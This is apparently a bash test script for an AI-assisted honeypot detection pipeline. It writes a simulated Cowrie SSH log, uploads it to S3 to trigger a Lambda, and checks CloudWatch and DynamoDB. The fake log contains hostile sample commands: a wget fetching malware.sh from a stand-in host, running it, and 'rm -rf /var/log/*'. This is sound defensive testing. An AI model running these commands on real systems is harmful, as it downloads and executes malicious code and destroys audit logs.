#!/bin/bash

# Create a test log with high severity indicators
cat > test_high_severity.json << EOF
{
  "event_id": "test-high-$(date +%s)",
  "timestamp": "$(date -u +"%Y-%m-%dT%H:%M:%SZ")",
  "src_ip": "192.168.1.100",
  "eventid": "cowrie.login.success",
  "username": "root",
  "password": "password123",
  "session": "test-session-1",
  "protocol": "ssh",
  "commands": [
    "wget http://malware.example.com/malware.sh",
    "chmod +x malware.sh",
    "./malware.sh",
    "rm -rf /var/log/*"
  ]
}
EOF

echo "Created test log file: test_high_severity.json"

# Upload to S3 to trigger Lambda
aws s3 cp test_high_severity.json s3://creditcardd/cowrie-logs/high_severity_$(date +%s).json --region us-east-1

echo "Uploaded test log to S3"
echo "Check your email for high-severity alert"
echo "Waiting for Lambda to process..."
sleep 5

# Check CloudWatch logs for Lambda execution
echo "Checking CloudWatch logs..."
aws logs filter-log-events \
    --log-group-name "/aws/lambda/threat-detect-bedrock-dev-threatAnalyzer" \
    --filter-pattern "Generated AI threat analysis" \
    --region us-east-1 \
    --limit 5 \
    --output text

# Check DynamoDB for the processed threat
echo "Checking DynamoDB for processed threat..."
aws dynamodb scan --table-name ThreatsTable --limit 5 --region us-east-1 --output text